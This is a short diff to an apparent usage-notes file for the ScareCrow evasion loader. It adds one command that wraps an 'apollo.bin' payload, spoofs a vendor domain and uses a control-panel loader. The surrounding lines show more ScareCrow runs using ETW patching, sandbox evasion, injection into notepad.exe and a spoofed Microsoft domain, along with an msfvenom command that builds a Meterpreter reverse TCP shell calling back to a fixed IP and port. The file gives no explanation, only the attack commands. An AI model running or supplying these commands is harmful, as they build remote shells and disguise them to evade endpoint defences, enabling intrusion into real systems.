@@ -2,6 +2,7 @@
 ./ScareCrow -I /path/to/your/payload.bin -etw -domain www.microsoft.com
 ./ScareCrow -I /path/to/your/payload.bin -sandbox -domain www.microsoft.com
 ./ScareCrow -I stageless.bin -domain www.microsoft.com -injection C:\\Windows\\System32\\notepad.exe
+ScareCrow_4.1_linux_amd64 -I apollo.bin -domain www.elastic.co -Loader control
 
 
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.10.108 lport=7777 -f raw -o hackerman.bin
